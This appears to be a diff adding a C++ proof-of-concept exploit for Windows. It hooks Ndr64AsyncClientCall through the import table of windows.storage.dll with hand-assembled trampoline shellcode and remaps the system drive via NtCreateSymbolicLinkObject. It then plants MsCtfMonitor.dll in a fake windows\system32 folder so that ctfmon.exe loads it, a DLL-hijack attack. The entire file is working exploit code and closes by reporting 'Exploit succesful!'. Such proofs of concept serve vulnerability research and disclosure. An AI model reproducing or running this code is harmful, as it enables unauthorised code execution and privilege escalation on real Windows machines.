@@ -1,0 +1,358 @@
+// POC_REMAP.cpp : This file contains the 'main' function. Program execution begins and ends there.
+
+//_CRT_SECURE_NO_WARNINGS
+
+
+#define _CRT_SECURE_NO_WARNINGS
+
+#include <iostream>
+
+///////////////////////////////////////////////////////////////////////////////////////////
+
+#include <windows.h>
+#include <winternl.h>
+#include <stdio.h>
+
+///////////////////////////////////////////////////////////////////////////////////////////
+
+char trampoline [] =
+{
+//  0xcc, // breakpoint
+
+  0x48, 0xb8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,  // "mov rax,1111111111111111h" // address to save RBX
+  0x48, 0x89, 0x18,                                            // "mov [rax],rbx" // saving RBX
+
+  0x5b,                                                        // "pop rbx" // getting return address
+  0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,  // "mov rax,2222222222222222h" // original function address
+  0xff, 0xd0,                                                  // "call rax" // calling original function
+  0x53,                                                        // "push rbx" // restoring return address
+  0x50,                                                        // "push rax" // saving result
+
+// Saving all registers
+  0x41, 0x57,      		                               // "push r15"
+  0x41, 0x56,      		                               // "push r14"
+  0x41, 0x55,      		                               // "push r13"
+  0x41, 0x54,      		                               // "push r12"
+  0x41, 0x53,      		                               // "push r11"
+  0x41, 0x52,      		                               // "push r10"
+  0x41, 0x51,      		                               // "push r9"
+  0x41, 0x50,      		                               // "push r8"
+  0x54,			                                       // "push rsp"
+  0x55,			                                       // "push rbp"
+  0x57,			                                       // "push rdi"
+  0x56,			                                       // "push rsi"
+  0x52,			                                       // "push rdx"
+  0x51,			                                       // "push rcx"
+  0x53,			                                       // "push rbx"
+  0x50,			                                       // "push rax"
+
+// Executing my code
+  0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,  // "mov rax,3333333333333333h" // executing my code
+  0xff, 0xd0,                                                  // "call rax" // calling original function
+
+// Restoring all registers
+  0x58,                	                                       // "pop rax"
+  0x5B,                	                                       // "pop rbx"
+  0x59,                	                                       // "pop rcx"
+  0x5A,                	                                       // "pop rdx"
+  0x5E,                	                                       // "pop rsi"
+  0x5F,                	                                       // "pop rdi"
+  0x5D,                	                                       // "pop rbp"
+  0x5C,                	                                       // "pop rsp"
+  0x41, 0x58,             	                               // "pop r8"
+  0x41, 0x59,             	                               // "pop r9"
+  0x41, 0x5A,             	                               // "pop r10"
+  0x41, 0x5B,             	                               // "pop r11"
+  0x41, 0x5C,             	                               // "pop r12"
+  0x41, 0x5D,             	                               // "pop r13"
+  0x41, 0x5E,             	                               // "pop r14"
+  0x41, 0x5F,             	                               // "pop r15"
+
+  0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44,  // "mov rax,4444444444444444h" // address from restore RBX
+  0x48, 0x8b, 0x18,                                            // "mov rbx,[rax]" // restoring RBX
+  0x58,                	                                       // "pop rax" // restoring function result
+  0xc3,                                                        // "ret" // returning to original execution path
+};
+
+int ( *NtCreateSymbolicLinkObject ) ( HANDLE * , int , void * , UNICODE_STRING * );
+char * info [ 0x30 / sizeof ( __int64 ) ];
+UNICODE_STRING s;
+HANDLE h;
+
+///////////////////////////////////////////////////////////////////////////////////////////
+
+VOID get_current_dos_device ( int size , char *current_device_path )
+{
+  char current_directory [ 0x100 ];
+  char current_volume [ 0x100 ];
+  char current_dos_device [ 0x100 ];
+  char final_path [ 0x200 ];
+  
+// Getting current directory
+  GetCurrentDirectory ( sizeof ( current_directory ) , current_directory );
+//  printf ( "current_directory: %s\n" , current_directory );
+
+// Getting current volume (like "C:" or "D:")
+  strncpy ( current_volume , current_directory , 2 );
+  current_volume [ 2 ] = 0;
+
+// Getting current device
+//  ret = QueryDosDeviceA ( "c:" , buffer , sizeof ( buffer ) );
+  QueryDosDeviceA ( current_volume , current_dos_device , sizeof ( current_dos_device ) );
+//  printf ( "current_dos_device: %s\n" , current_dos_device );
+
+// Building final path
+  strcpy ( final_path , current_dos_device );
+  strcat ( final_path , current_directory + 2 );
+
+// Returning device path name
+  strncpy ( current_device_path , final_path , size );
+}
+
+///////////////////////////////////////////////////////////////////////////////////////////
+
+void ascii_to_unicode ( char *ascii , char *unicode )
+{
+  unsigned int cont;
+  unsigned int len;
+
+// Getting string length
+  len = strlen ( ascii ) + 1;
+
+// Converting char by char
+  for ( cont = 0 ; cont < len ; cont ++ )
+  {
+  // Next character
+    * ( unsigned short * ) ( unicode + ( cont * 2 ) ) = ( unsigned short ) ascii [ cont ];
+  }
+}
+
+///////////////////////////////////////////////////////////////////////////////////////////
+
+// A lazy way to find the IAT
+
+void *get_iat ( char *module , void *function_address )
+{
+  void *iat_address = NULL;
+  unsigned int offset = 0;
+
+// Moving through the module
+  while ( TRUE )
+  {
+  // Checking is the end of module was found
+    if ( ( offset % 0x1000 ) == 0 )
+    {    
+    // If the page is not mapped
+      if ( IsBadReadPtr ( module + offset , sizeof ( void * ) ) == TRUE )
+      {
+      // Stop finding
+        break;
+      }
+    }
+
+  // If it's the function address
+    if ( * ( void ** ) ( module + offset ) == function_address )
+    {
+    // Returning IAT address
+      iat_address = ( void * ) ( module + offset );
+
+    // Stop finding
+      break;
+    }
+
+  // Moving to the next QWORD
+    offset += sizeof ( void * );
+  }
+
+  return ( iat_address );
+}
+
+///////////////////////////////////////////////////////////////////////////////////////////
+
+int replace_trampoline_value ( char *shellcode , unsigned int size , unsigned __int64 original_value , unsigned __int64 value )
+{
+  unsigned int pos;
+  int ret = FALSE;
+
+// Going through the buffer
+  for ( pos = 0 ; pos < ( size - sizeof ( unsigned __int64 ) ) ; pos ++ )
+  {
+  // If it's the searched value
+    if ( * ( unsigned __int64 * ) ( shellcode + pos ) == original_value )
+    {
+    // Replacing value
+      * ( unsigned __int64 * ) ( shellcode + pos ) = value;
+
+    // Returning OK
+      ret = TRUE;
+
+    // stop finding
+      break;
+    }
+  }
+
+  return ( ret );
+}
+
+///////////////////////////////////////////////////////////////////////////////////////////
+
+void remap_system_drive ( void )
+{
+// A little delay until "ctfmon.exe" appears as SUSPENDED
+// A better way to do that is by checking the process list until it's created
+  Sleep ( 1000 );
+
+// Remapping "C:"
+  h = 0;
+  NtCreateSymbolicLinkObject ( &h , 0xf0001 , &info , &s );
+  printf ( "[+] Handle: %x\n" , h );
+}
+
+///////////////////////////////////////////////////////////////////////////////////////////
+
+VOID main()
+{
+  char buffer [ 0x100 ];
+  char current_dos_device [ 0x100 ];
+  char current_dos_device_w [ 0x200 ];
+  char system_directory [ 0x100 ];
+  char drive_to_remap [ 16 ];
+  char device_to_remap [ 16 ];
+  char device_to_remap_w [ 16 ];
+  void **Ndr64AsyncClientCall_IAT;
+  void *Ndr64AsyncClientCall;
+  void *hook;
+  unsigned __int64 RBX;
+  UNICODE_STRING drive;
+  HANDLE event;
+  int oldp;
+  int ret;
+
+// Solving function address
+  NtCreateSymbolicLinkObject = (int(*)( HANDLE *,int,void *,UNICODE_STRING *)) GetProcAddress ( GetModuleHandle ( "ntdll.dll" ) , "NtCreateSymbolicLinkObject" );
+
+// Creating event object
+  event = CreateEvent ( NULL , FALSE , FALSE , "ctfmon_owned" );
+
+// Allocating page to push the HOOK
+  hook = VirtualAlloc ( NULL , 0x1000 , MEM_COMMIT | MEM_RESERVE , PAGE_EXECUTE_READWRITE ); 
+  memset ( hook , 0 , 0x1000 );
+
+// Getting current DOS device pathname 
+  get_current_dos_device ( sizeof ( current_dos_device ) , current_dos_device );
+  printf ( "[+] Current pathname: %s\n" , current_dos_device );
+
+// Getting UNICODE version
+  ascii_to_unicode ( current_dos_device , current_dos_device_w );
+
+// Initializing absolut path
+  s.Length = strlen ( current_dos_device ) * 2;
+  s.MaximumLength = s.Length + 2;
+  s.Buffer = ( PWSTR ) current_dos_device_w;
+
+// Getting system path
+  GetSystemDirectory ( system_directory , sizeof ( system_directory ) );
+//  printf ( "system: %s\n" , system_directory );
+
+// Getting drive to remap
+  strncpy ( drive_to_remap , system_directory , 2 );
+  drive_to_remap [ 2 ] = 0;
+
+// Getting device to remap
+  sprintf ( device_to_remap , "\\??\\%s" , drive_to_remap );
+//  printf ( "%s\n" , device_to_remap );
+
+// Getting UNICODE version
+  ascii_to_unicode ( device_to_remap , device_to_remap_w );
+//  wprintf ( L"%s\n" , device_to_remap_w );
+
+// Drive to remap (it's almost always "C:")
+  drive.Length = strlen ( device_to_remap ) * 2;
+  drive.MaximumLength = drive.Length + 2;
+  drive.Buffer = ( PWSTR ) device_to_remap_w;
+
+// Initiazlying structure to be used by "NtCreateSymbolicLinkObject"
+  info [ 0 ] = ( char * ) 0x30;
+  info [ 1 ] = ( char * ) 0;
+  info [ 2 ] = ( char * ) &drive;
+  info [ 3 ] = ( char * ) 0x40;
+  info [ 4 ] = ( char * ) buffer;
+  info [ 5 ] = ( char * ) 0;
+ 
+  memset ( buffer , 0 , sizeof ( buffer ) );
+  * ( unsigned __int64 * ) ( buffer + 0x00 ) = 0xc0001; // Flags
+
+//////
+
+// Executing the program JUST to initialize the DLLs
+  ShellExecute ( 0x0 , "open" , "ctfmon.exe" , "" , NULL , 1 );
+
+// Getting function to be hooked
+  Ndr64AsyncClientCall = GetProcAddress ( GetModuleHandle ( "rpcrt4.dll" ) , "Ndr64AsyncClientCall" );
+  printf ( "[+] Ndr64AsyncClientCall: %p\n" , Ndr64AsyncClientCall );
+
+// Looking for IAT in "windows.storage.dll"
+  Ndr64AsyncClientCall_IAT = ( void ** ) get_iat ( ( char * ) GetModuleHandle ( "windows.storage.dll" ) , Ndr64AsyncClientCall );
+  printf ( "[+] Ndr64AsyncClientCall_IAT: %p\n" , Ndr64AsyncClientCall_IAT );
+
+// Address to save/restore RBX
+  replace_trampoline_value ( trampoline , sizeof ( trampoline ) , 0x1111111111111111 , ( unsigned __int64 ) &RBX );
+  replace_trampoline_value ( trampoline , sizeof ( trampoline ) , 0x2222222222222222 , ( unsigned __int64 ) Ndr64AsyncClientCall );
+  replace_trampoline_value ( trampoline , sizeof ( trampoline ) , 0x3333333333333333 , ( unsigned __int64 ) remap_system_drive );
+  replace_trampoline_value ( trampoline , sizeof ( trampoline ) , 0x4444444444444444 , ( unsigned __int64 ) &RBX );
+
+// Writing trampoline
+  memcpy ( hook , trampoline , sizeof ( trampoline ) );
+
+// Setting a trampoline in the PROLOGUE of the function (a CALL)
+  VirtualProtect ( Ndr64AsyncClientCall_IAT , sizeof ( void * ) , PAGE_READWRITE ,(PDWORD) &oldp );
+  *Ndr64AsyncClientCall_IAT = hook;
+  VirtualProtect ( Ndr64AsyncClientCall_IAT , sizeof ( void * ) , oldp ,(PDWORD) &oldp );
+
+//////
+
+// User message
+  printf ( "[+] Launching exploit...\n" );
+
+// Creating Windows directory (or if it was created before)
+  if ( CreateDirectory ( ".\\windows" , NULL ) == TRUE || GetLastError () == ERROR_ALREADY_EXISTS )
+  {
+  // Creating System32 subdirectory
+    CreateDirectory ( ".\\windows\\system32" , NULL );
+  }
+  else
+  {
+  // User message
+    printf ( "[-] Error: the exploit doesn't have permissions to create a directory\n" );
+    return;
+  }
+
+//  system ( "move MsCtfMonitor.dll .\\windows\\system32" );
+  if ( CopyFile ( ".\\MsCtfMonitor.dll" , ".\\windows\\system32\\MsCtfMonitor.dll" , FALSE ) == FALSE )
+  {
+  // User message
+    printf ( "[-] Error copying 'MsCtfMonitor.dll' to '.\\windows\\system32' (the file exists?)\n" );
+    return;
+  }
+
+// Executing target program
+  ShellExecute ( 0x0 , "open" , "ctfmon.exe" , "/?" , NULL , 1 );
+
+// Waiting for the DLL loaded
+  printf ( "[+] Waiting for DLL hijacked\n" );
+  ret = WaitForSingleObject ( event , 10000 );
+
+// Closing "C:" remapping
+  CloseHandle ( h );
+
+// Unhooking IAT
+  VirtualProtect ( Ndr64AsyncClientCall_IAT , sizeof ( void * ) , PAGE_READWRITE ,(PDWORD) &oldp );
+  *Ndr64AsyncClientCall_IAT = Ndr64AsyncClientCall;
+  VirtualProtect ( Ndr64AsyncClientCall_IAT , sizeof ( void * ) , oldp ,  (PDWORD) & oldp);
+
+// Last message
+  printf ( "[+] Exploit succesful!\n" );
+}
+
+///////////////////////////////////////////////////////////////////////////////////////////
+
